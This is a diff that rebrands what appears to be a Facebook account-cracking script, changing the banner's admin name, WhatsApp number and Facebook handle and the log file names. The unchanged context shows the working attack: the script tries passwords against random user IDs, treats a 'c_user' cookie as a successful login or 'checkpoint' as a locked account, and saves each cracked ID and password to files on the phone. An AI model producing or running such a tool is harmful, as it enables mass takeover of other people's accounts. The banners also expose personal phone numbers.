@@ -25,15 +25,15 @@ logo =                                          """
 \033[1;35m      | $$  | $$| $$/   \  $$
 \033[1;32m      |__/  |__/|__/     \__/
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\n\x1b[1;92m   ADMIN : \x1b[1;97mRamXan   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0
+\n\x1b[1;92m   ADMIN : \x1b[1;97mANUM   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0
 
-         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923059361667
-          \x1b[1;92m FACEBOOK:  \x1b[1;95mRamXan Tanha
+         \x1b[1;92m  WHATSAPP: \x1b[1;95m+9231795*****
+          \x1b[1;92m FACEBOOK:  \x1b[1;95mANUM_MAFAI
 \033[1;37m------------------------\033[1;37m------------------------ """
 def ud():
     
     print(logo)
-    print('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
+    print('\RANDOM NUMBER CRACKER OKAY')
     print('')
     print('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
     print('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
@@ -161,9 +161,9 @@ logo =                                          """
 \033[1;35m      | $$  | $$| $$/   \  $$
 \033[1;32m      |__/  |__/|__/     \__/
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\n\x1b[1;92m   ADMIN : \x1b[1;97mZUBAIR   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0
-         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923181941179
-          \x1b[1;92m FACEBOOK:  \x1b[1;95ZUBAIR00
+\n\x1b[1;92m   ADMIN : \x1b[1;97mANUM   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0
+         \x1b[1;92m  WHATSAPP: \x1b[1;95m+9231795*****
+          \x1b[1;92m FACEBOOK:  \x1b[1;95ANUM_MAFAI
 \033[1;37m------------------------\033[1;37m------------------------ """
 loop = 0
 oks = []
@@ -313,22 +313,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[1;32m[ZUBAIR-OK]  ' +cid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')
+                print('\033[1;32m[ANUM-OK]  ' +cid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/ZUBAIR-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/ANUM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 print('\33[1;35m[MEMER-CP]  ' +cid+ ' | ' +ps+      '  \33[0;97m')
-                open('/sdcard/ZUBAIR-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                open('/sdcard/ANUM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r %s[MALANG] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r %s[MAFAI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
